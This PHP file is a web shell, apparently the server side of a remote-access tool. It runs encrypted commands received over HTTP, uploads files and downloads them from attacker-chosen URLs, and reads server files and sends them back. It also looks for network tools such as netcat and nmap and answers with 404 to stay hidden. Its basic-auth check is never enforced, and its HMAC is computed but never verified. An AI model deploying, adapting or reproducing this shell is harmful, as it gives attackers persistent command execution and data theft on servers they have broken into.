<?php
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// This script should be run via HTTP only
if (php_sapi_name() === 'cli') {
    exit(-1);
}

$method = 'openssl';
if (!is_function_available('openssl_encrypt')) {
    $method = 'mcrypt';
}

$key = '[KEY_HERE]';
$login = '[LOGIN_HERE]';
$password = '[PASSWORD_HERE]';

header("Content-type: plain/text");
header("Pragma: no-cache");
header("Expires: 0");
header_remove("X-Powered-By");

// Basic Auth is required
require_auth($login, $password);

// Internal actions
if (isset($_POST['i'])) {
    $action = base64_decode($_POST['i']);

    if ($action == 'ping') {
        header("HTTP/1.1 200 OK");
        $owner = '';
        if (is_function_available('posix_getpwuid')) {
            $owner_uid = posix_getpwuid(posix_geteuid());
            $owner = $owner_uid['name'];
        } else {
            $owner = get_current_user();
        }
        $ip = "";
        if (isset($_SERVER['SERVER_ADDR'])) {
            $ip = $_SERVER['SERVER_ADDR'];
        } else {
            $ip = $_SERVER['SERVER_NAME'];
        }
        $output = json_encode(array(
            'user' => $owner,
            'path' => getcwd(),
            'hostname' => gethostname(),
            'php' => phpversion(),
            'os' => php_uname(),
            'server' => $_SERVER['SERVER_SOFTWARE'],
            'time' => date('l jS F Y h:i:s A'),
            'ip' => $ip,
            'client_ip' => get_client_ip(),
            'tools' => implode('|', find_tools()),
            'method' => $method
        ));
        echo encrypt($output, $key, $method);
    }
    exit(0);
}

// Return 404 if we don't receive the action
if (!isset($_POST['c']) && !isset($_POST['f'])) {
    header("HTTP/1.1 404 Not Found");
    header_remove("Content-type");
    exit(-1);
}

$output = '';
$downloads = array();
$path = realpath(base64_decode($_POST['p']));
chdir($path);

if (isset($_POST['c'])) {
    // Receiving the command
    $cmd = base64_decode(decrypt($_POST['c'], $key, $method));

    // If we receive a `cd` command, we need to move ...
    if (substr($cmd, 0, 3) == 'cd ') {
        $dir = substr($cmd, 3);
        if ($dir == '~/') {
            $user = posix_getpwuid(posix_getuid());
            $dir = $user['dir'];
        }

        $path = realpath($dir);
        if (is_dir($path)) {
            chdir($path);
        }
    } else {

        // Let's run the action
        if (strlen($cmd) > 0) {
            $output = execute_command($cmd);
        }
    }
}

if (isset($_POST['f'])) {
    $files = $_POST['f'];
    if (isset($files['d'])) {
        foreach ($files['d'] as $file) {
            $name = base64_decode(decrypt($file, $key, $method));
            $payload = file_to_base64($name);
            array_push($downloads, array(
                'name' => $name,
                'content' => $payload
            ));
        }
    }

    if (isset($files['u'])) {
        foreach ($files['u'] as $encrypted_url) {
            $name = base64_decode(decrypt($encrypted_url['n'], $key, $method));
            $payload = base64_decode(decrypt($encrypted_url['p'], $key, $method));
            $result = download_file_from_url($payload, $path, $name);
            if (is_null($result)) {
                $output .= "Permission denied {$path}/{$name}\n";
            } elseif ($result == false) {
                $output .= "Unable to download the file\n";
            } else {
                $output .= $result . "\n";
            }
        }
    }

    if (isset($files['b'])) {
        foreach ($files['b'] as $encrypted_binary) {
            $name = base64_decode(decrypt($encrypted_binary['n'], $key, $method));
            $payload = base64_decode(decrypt($encrypted_binary['p'], $key, $method));
            $result = base64_to_file($payload, $path, $name);
            if (is_null($result)) {
                $output .= "Permission denied {$path}/{$name}\n";
            } else {
                $output .= $result . "\n";
            }
        }
    }
}

// Now, we need to return an encrypted json
$response = array(
    'output' => base64_encode($output),
    'path' => base64_encode(getcwd()),
    'files' => $downloads
);
exit(encrypt(json_encode($response), $key, $method));

/*------------------*/
/*- Core Functions -*/
/*------------------*/

// Validate the Basic Auth
function require_auth($login, $password)
{
    header('Cache-Control: no-cache, must-revalidate, max-age=0');
    $has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
    $is_not_authenticated = (!$has_supplied_credentials || $_SERVER['PHP_AUTH_USER'] != $login || $_SERVER['PHP_AUTH_PW'] != $password);
    return $is_not_authenticated;
}

// Let's try to find our shell
function get_shell_command()
{
    $shell_command = null;
    if ($shell_command === null) {
        if (is_function_available('proc_open')) {
            $shell_command = 'proc_open';
        } elseif (is_function_available('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_function_available('exec')) {
            $shell_command = 'exec';
        } elseif (is_function_available('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_function_available('system')) {
            $shell_command = 'system';
        } elseif (is_function_available('popen')) {
            $shell_command = 'popen';
        }
    }

    return $shell_command;
}

// Run, baby!
function execute_command($command, $win_trick = true)
{
    if (DIRECTORY_SEPARATOR === '/') {
        $command .= ' 2>&1';
    }

    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;
        case 'shell_exec':
            return @shell_exec($command);
        case 'exec':
            @exec($command, $outputArr, $code);
            return implode(PHP_EOL, $outputArr);
        case 'passthru':
            ob_start();
            @passthru($command, $code);
            $output = ob_get_contents();
            ob_end_clean();
            return $output;
        case 'proc_open':
            $descriptors = array(
                0 => array(
                    'pipe',
                    'r'
                ),
                1 => array(
                    'pipe',
                    'w'
                ),
                2 => array(
                    'pipe',
                    'w'
                )
            );
            if (DIRECTORY_SEPARATOR === '\\') {
                $old_trick = $command;
                if ($win_trick) {
                    $old_trick = "C:\\Windows\\System32\\cmd.exe /C {$command}";
                }

                $process = @proc_open($old_trick, $descriptors, $pipes, getcwd(), null, array(
                    'suppress_errors' => false,
                    'bypass_shell' => true
                ));
                if (!is_resource($process)) {
                    $old_trick = $command;
                    $process = @proc_open($old_trick, $descriptors, $pipes, getcwd(), null, array(
                        'suppress_errors' => false,
                        'bypass_shell' => true
                    ));
                }
            } else {
                $process = proc_open($command, $descriptors, $pipes, getcwd());
            }

            $output = "";
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $error = stream_get_contents($pipes[2]);
                $output .= $error;
                fclose($pipes[2]);
                $code = proc_close($process);
            }

            return $output;
        case 'popen':
            $process = popen($command, 'r');
            $output = fread($process, 4096);
            pclose($process);
            return $output;
        default:
            return 'None available function to run your command, sorry. :(';
    }
}

// Getting the disabled functions
function disabled_functions()
{
    static $disabled_fn;
    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, @create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}

// Whether or not a function is available
function is_function_available($function)
{
    return is_callable($function) && !in_array($function, disabled_functions());
}

// Let's try to find the real client IP
function get_client_ip()
{
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) //check ip from share internet
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) //to check ip is pass from proxy
    {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
}

// Find some tools
function find_tools()
{
    $found = array();
    $tools = array(
        'python',
        'perl',
        'ruby',
        'nc',
        'netcat',
        'ncat',
        'gcc',
        'nmap',
        'wget',
        'curl'
    );
    $command = null;
    if (DIRECTORY_SEPARATOR === '/') {
        $command = 'which';
    } else {
        $command = 'where';
    }

    if (!empty($command)) {
        foreach ($tools as $tool) {
            $output = execute_command("{$command} {$tool}", false);
            if (strlen(trim($output)) > 0) {
                array_push($found, $tool);
            }
        }
    }

    return $found;
}

// Create file from base64
function base64_to_file($base64_string, $path, $output_file)
{
    if (!is_writable($path)) {
        return null;
    }

    $complete_path = $path . '/' . $output_file;
    $handle = fopen($complete_path, "wb");
    fwrite($handle, base64_decode($base64_string));
    fclose($handle);
    return $output_file;
}

// Read file to Base64
function file_to_base64($file)
{
    if (file_exists($file) && is_readable($file)) {
        return base64_encode(file_get_contents($file));
    }

    return null;
}

// Download file from URL
function download_file_from_url($url, $path, $output_file)
{
    if (!is_writable($path)) {
        return null;
    }

    $complete_path = $path . '/' . $output_file;
    $options = array(
        CURLOPT_FILE => is_resource($complete_path) ? $complete_path : fopen($complete_path, 'w'),
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_URL => $url,
        CURLOPT_FAILONERROR => true
    );
    $ch = curl_init();
    curl_setopt_array($ch, $options);
    $return = curl_exec($ch);
    if ($return === false) {
        return false;
    }

    return $output_file;
}

// Encrypts a string
function encrypt($plaintext, $secret_key, $method = 'openssl')
{
    $ciphertext = '';

    if($method=='openssl') {
        $key = $secret_key;
        $cipher = "AES-256-CBC";
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
        $ciphertext = base64_encode($iv . $hmac . $ciphertext_raw);
    } elseif ($method='mcrypt') {
        $key = pack('H*', $secret_key);
        $iv_size = @mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);
        $iv = @mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $ciphertext = @mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
        $ciphertext = $iv . $ciphertext;
        $ciphertext = base64_encode($ciphertext);
    }

    return $ciphertext;
}

// Decrypts an encrypted string
function decrypt($ciphertext, $secret_key, $method = 'openssl')
{
    $ciphertext_decoded = base64_decode($ciphertext);

    if($method=='openssl') {
        $key = $secret_key;
        $cipher = "AES-256-CBC";
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = substr($ciphertext_decoded, 0, $ivlen);
        $hmac = substr($ciphertext_decoded, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($ciphertext_decoded, $ivlen + $sha2len);
        $original_plaintext = @openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
        return trim($original_plaintext);
    } elseif ($method='mcrypt') {
        $key = pack('H*', $secret_key);
        $iv_size = @mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);
        $iv_dec = substr($ciphertext_decoded, 0, $iv_size);
        $ciphertext_dec = substr($ciphertext_decoded, $iv_size);
        return trim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec));
    }
}
